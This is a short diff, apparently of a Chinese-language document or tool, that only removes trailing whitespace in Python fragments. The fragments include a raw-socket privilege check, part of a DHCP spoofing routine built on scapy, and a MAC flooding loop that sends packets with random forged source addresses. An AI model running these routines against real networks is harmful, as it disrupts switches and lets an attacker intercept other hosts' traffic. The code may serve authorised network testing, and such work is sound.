@@ -100,7 +100,7 @@ def check_permissions(self) -> bool:
         # 检查是否以 root 身份运行
         if os.geteuid() == 0:
             return True
-            
+
         # 在 Linux 上，检查 NET_RAW 能力
         if sys.platform == "linux":
             with open("/proc/self/status") as f:
@@ -110,7 +110,7 @@ def check_permissions(self) -> bool:
                         # NET_RAW 是能力 13
                         if (cap_eff >> 13) & 1:
                             return True
-                            
+
         return False
     except Exception:
         return False
@@ -202,7 +202,7 @@ async def _run_dhcp_spoof_attack(self, target_mac: str, duration: int):
                 ])
             )
             sendp(offer, iface=iface, verbose=False)
-    
+
     # 嗅探并响应
     sniff(filter="udp and port 67", prn=handle_dhcp, timeout=duration)
 ```
@@ -226,19 +226,19 @@ async def _run_dhcp_spoof_attack(self, target_mac: str, duration: int):
 async def _run_mac_flood_attack(self, target_mac: str, duration: int):
     """执行 MAC 泛洪攻击。"""
     import random
-    
+
     while time.time() < end_time:
         # 生成随机 MAC
         fake_mac = ":".join([
             f"{random.randint(0, 255):02x}" for _ in range(6)
         ])
-        
+
         # 发送带有伪造源的数据包
         flood_packet = (
             Ether(src=fake_mac, dst=target_mac)
             / IP() / ICMP()
         )
-        
+
         await asyncio.to_thread(sendp, flood_packet, iface=iface)
         await asyncio.sleep(0.01)  # 100 pps
 ```
